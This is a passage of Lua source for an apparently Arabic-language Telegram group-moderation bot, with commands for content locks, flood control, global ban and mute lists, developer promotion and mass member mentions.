database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل السيلفي بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل السيلفي بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل السيلفي بالطرد\n⛔┇ الحاله ←الطرد ')  
end,nil)   
elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح السيلفي ↝ ܰ')  
end,nil)   
end
if text == 'قفل الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الماركدون ↝ ܰ')  
end,nil)   
elseif text == 'قفل الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الماركداون بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الماركداون بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الماركداون بالطرد\n⛔┇ الحاله ←الطرد ')  
end,nil)   
elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الماركدون ↝ ܰ')  
end,nil)   
end
if text == 'قفل الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الجهات ↝ ܰ')  
end,nil)   
elseif text == 'قفل الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الجهات بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الجهات بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الجهات بالطرد\n⛔┇ الحاله ←الطرد ')  
end,nil)   
elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الجهات ↝ ܰ')  
end,nil)   
end
if text == 'قفل الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الكلايش ↝ ܰ')  
end,nil)   
elseif text == 'قفل الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الكلايش بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الكلايش بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n☑️┇ تـم قفـل الكلايش بالطرد\n⛔┇ الحاله ←الطرد ')  
end,nil)   
elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الكلايش ↝ ܰ')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل التكرار ↝ ٭\n┘ الحالة ◃ التقييد ܊ الكتم ܊ [الطرد](t.me/R_IQ9) .')
elseif text == 'قفل التكرار' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم فتح التكرار ↝ ٭\n┘ الحالة ༯ [المسـح](t.me/R_IQ9) ٭')
elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل التكرار ↝ ٭\n┘ الحالة ◃ [التقييد](t.me/R_IQ9) ܊ الكتم ܊ الطرد .')
elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل التكرار ↝ ٭\n┘ الحالة ◃ التقييد ܊ [الكتم](t.me/R_IQ9) ܊ الطرد .')
elseif text == 'فتح التكرار' and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┘ تم فتح التكرار ↝ ٭')
end 
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and SudoBot(msg) then    
dofile('MILAN.lua')  
send(msg.chat_id_, msg.id_, '✥┆ تم تحديث الملفات . 𖦲 ◜') 
end 
if text == ("مسح قائمه العام") and SudoBot(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n܁༯┆تم مسـح قائمةه العام ↝ ܰ')
return false
end

if text == ("قائمه العام") and SudoBot(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n܁༯┆قائمة العام ↝↝ .\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜*@"..username.."*◞  ↝🦄 .\n"
else
end
end
if #list == 0 then
t = "٭ 𖤹┆لا يوجد احد محظور عام ☓◟"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("حظر عام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك حظر المطور الاساسي ↝ ܰ\n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك حظر البوت  ↝ ܰ\n")
return false 
end
database:sadd(bot_id..'GBan:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم حظر العضو عام  ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and SudoBot(msg) then
local username = text:match("^حظر عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆لا تستطيع حظر البوت ↝ ܰ")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك حظر المطور الاساسي ↝ ܰ\n")
return false 
end
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم حظر العضو عام  ↝ ܰ'
texts = usertext..status
database:sadd(bot_id..'GBan:User', result.id_)
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ\n'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and SudoBot(msg) then
local userid = text:match("^حظر عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك حظر المطور الاساسي ↝ ܰ\n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك حظر البوت  ↝ ܰ")
return false 
end
database:sadd(bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم حظر العضو عام  ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم حظر العضو عام  ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك كتم المطور الاساسي ↝ ܰ\n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك كتم البوت عام  ↝ ܰ")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم كتم العضو عام من المجموعات  ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and SudoBot(msg) then
local username = text:match("^كتم عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك كتم البوت  ↝ ܰ")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك كتم المطور الاساسي  ↝ ܰ\n")
return false 
end
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم كتم العضو عام من المجموعات  ↝ ܰ'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ\n'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and SudoBot(msg) then
local userid = text:match("^كتم عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك كتم المطور الاساسي ↝ ܰ\n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆لايمكنك كتم البوت  ↝ ܰ")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)

tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم كتم العضو عام من المجموعات  ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم كتم العضو عام من المجموعات  ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم الغاء ܊ الحظر ٭ الكتم ܊ عام من المجموعات ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and SudoBot(msg) then
local username = text:match("^الغاء العام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم الغاء ܊ الحظر ٭ الكتم ܊ عام من المجموعات ↝ ܰ'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and SudoBot(msg) then
local userid = text:match("^الغاء العام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'GBan:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم الغاء ܊ الحظر ٭ الكتم ܊ عام من المجموعات ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم الغاء ܊ الحظر ٭ الكتم ܊ عام من المجموعات ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("مسح المطورين") and SudoBot(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n܁༯┆تم مسح المطورين ↝ ܰ ")
end
if text == ("المطورين") and SudoBot(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n܁༯┆قائمة المطورين ↝↝ .\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜*@"..username.."*◞  ↝🦄 .\n"
else
end
end
if #list == 0 then
t = "٭ 𖤹┆لا يوجد مطوريين ☓◟"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "all" or text == "@all" and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."VVVZVV:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'VVVZVV:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,amir)
x = 0
tags = 0
local list = amir.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and SudoBot(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم رفع العضو ◃ مطور↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم رفع العضو ◃ مطور↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم رفع العضو ◃ مطور↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم رفع العضو ◃ مطور↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ?? •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم تنزيل العضو ◃ مطور↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
